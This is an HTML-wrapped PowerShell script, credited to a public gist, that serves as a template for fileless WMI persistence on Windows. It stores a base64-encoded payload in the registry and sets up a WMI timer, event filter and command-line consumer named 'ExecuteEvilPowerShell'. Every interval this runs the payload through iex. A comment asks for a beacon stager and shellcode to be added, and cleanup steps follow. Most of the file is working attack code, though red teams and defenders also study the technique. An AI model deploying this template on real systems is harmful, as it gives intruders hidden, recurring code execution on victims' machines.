<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>WMI_Persistence_Template.ps1</title>
</head><body>#mattifestation https://gist.github.com/mattifestation/e55843eef6c263608206<br/>
#Fileless WMI persistence payload template (CommandlineEventConsumer, __IntervalTimerInstruction trigger, w/ registry payload storage)<br/>
# Step #1 - Prep payload<br/>
$Hive = 'HKLM'<br/>
$PayloadKey = 'SOFTWARE\PayloadKey'<br/>
$PayloadValue = 'PayloadValue'<br/>
$TimerName = 'PayloadTrigger'<br/>
$EventFilterName = 'TimerTrigger'<br/>
$EventConsumerName = 'ExecuteEvilPowerShell'<br/>
<br/>
switch ($Hive) {<br/>
  'HKLM' { $HiveVal = [UInt32] 2147483650 }<br/>
  'HKCU' { $HiveVal = [UInt32] 2147483649 }<br/>
  'HKU' { $HiveVal = [UInt32] 2147483651 }<br/>
  'HKCR' { $HiveVal = [UInt32] 2147483648 }<br/>
  'HKCC' { $HiveVal = [UInt32] 2147483653 }<br/>
}<br/>
<br/>
$TimerArgs = @{<br/>
  IntervalBetweenEvents = ([UInt32] 10000) # 43200000 to trigger every 12 hours<br/>
  SkipIfPassed = $False<br/>
  TimerId = $TimerName<br/>
}<br/>
# i.e. payload will be stored in HKLM\SOFTWARE\PayloadKey - PayloadValue (REG_SZ)<br/>
<br/>
$Payload = {<br/>
  # Prep your raw beacon stager along with Invoke-Shellcode here<br/>
<br/>
  &quot;Owned at $(Get-Date)&quot; | Out-File C:\payload_result.txt<br/>
}<br/>
<br/>
$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))<br/>
<br/>
# Payload to be executed in the CommandLineEventConsumer upon triggering of the __IntervalTimerInstruction event.<br/>
$StagerPayload = &quot;powershell.exe -NoP -C `&quot;iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path $($Hive):\$PayloadKey -Name $PayloadValue).$PayloadValue)))`&quot;&quot;<br/>
<br/>
# Step #2 - Create payload reg key<br/>
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name CreateKey -ArgumentList @($HiveVal, $PayloadKey)<br/>
if ($Result.ReturnValue -ne 0) {<br/>
  Write-Warning &quot;Unable to create key: HKLM\$PayloadKey. Return value: $($Result.ReturnValue)&quot;<br/>
}<br/>
<br/>
# Step #3 - Store payload in reg value<br/>
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name SetStringValue -ArgumentList @($HiveVal, $PayloadKey, $EncodedPayload, $PayloadValue)<br/>
if ($Result.ReturnValue -ne 0) {<br/>
  Write-Warning &quot;Unable to store payload in HKLM\$PayloadKey $PayloadValue (REG_SZ). Return value: $($Result.ReturnValue)&quot;<br/>
}<br/>
<br/>
# Step #4 - Validate that the payload stored<br/>
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name GetStringValue -ArgumentList @($HiveVal, $PayloadKey, $PayloadValue)<br/>
if ($Result.ReturnValue -ne 0) {<br/>
  Write-Warning &quot;Unable to store payload in HKLM\$PayloadKey $PayloadValue (REG_SZ). Return value: $($Result.ReturnValue)&quot;<br/>
}<br/>
<br/>
if ($Result.sValue -ne $EncodedPayload) {<br/>
  Write-Warning &quot;The payload was not properly stored in HKLM\$PayloadKey $PayloadValue (REG_SZ).&quot;<br/>
}<br/>
<br/>
# Step #5 - Create the timer event<br/>
$Timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments $TimerArgs<br/>
<br/>
# Step #6 - Create event filter<br/>
$EventFilterArgs = @{<br/>
  EventNamespace = 'root/cimv2'<br/>
  Name = $EventFilterName<br/>
  Query = &quot;SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'&quot;<br/>
  QueryLanguage = 'WQL'<br/>
}<br/>
<br/>
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs<br/>
<br/>
# Step #7 - Create CommandLineEventConsumer<br/>
$CommandLineConsumerArgs = @{<br/>
  Name = $EventConsumerName<br/>
  CommandLineTemplate = $StagerPayload<br/>
}<br/>
<br/>
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs<br/>
<br/>
# Step #8 - Create FilterToConsumerBinding<br/>
$FilterToConsumerArgs = @{<br/>
  Filter = $Filter<br/>
  Consumer = $Consumer<br/>
}<br/>
<br/>
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs<br/>
<br/>
# Cleanup<br/>
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter &quot;Name = '$EventConsumerName'&quot;<br/>
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter &quot;Name = '$EventFilterName'&quot;<br/>
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query &quot;REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding&quot;<br/>
$TimerToCleanup = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter &quot;TimerId = '$TimerName'&quot;<br/>
<br/>
$FilterConsumerBindingToCleanup | Remove-WmiObject<br/>
$EventConsumerToCleanup | Remove-WmiObject<br/>
$EventFilterToCleanup | Remove-WmiObject<br/>
$TimerToCleanup | Remove-WmiObject</body></html>